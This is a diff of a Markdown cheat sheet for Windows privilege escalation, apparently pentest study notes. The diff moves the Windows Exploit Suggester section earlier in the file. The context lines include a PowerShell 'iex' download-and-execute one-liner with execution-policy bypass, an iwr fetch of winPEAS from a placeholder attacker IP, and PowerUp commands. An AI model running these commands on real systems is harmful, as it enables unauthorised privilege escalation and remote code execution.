@@ -6,6 +6,20 @@ powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadStrin
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
 ```
+# Windows Exploit Suggester
+https://github.com/bitsadmin/wesng
+```batch
+systeminfo
+```
+Save the output as systeminfo.txt locally.
+The run the tool:
+```bash
+pip install wesng
+```
+
+```
+wes.py systeminfo.txt
+```
 # PowerUp
 ```batch
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
@@ -33,18 +47,4 @@ Get-UnquotedService
 
 ```
 Invoke-AllChecks
-```
-# Windows Exploit Suggester
-https://github.com/bitsadmin/wesng
-```batch
-systeminfo
-```
-Save the output as systeminfo.txt locally.
-The run the tool:
-```bash
-pip install wesng
-```
-
-```
-wes.py systeminfo.txt
 ```
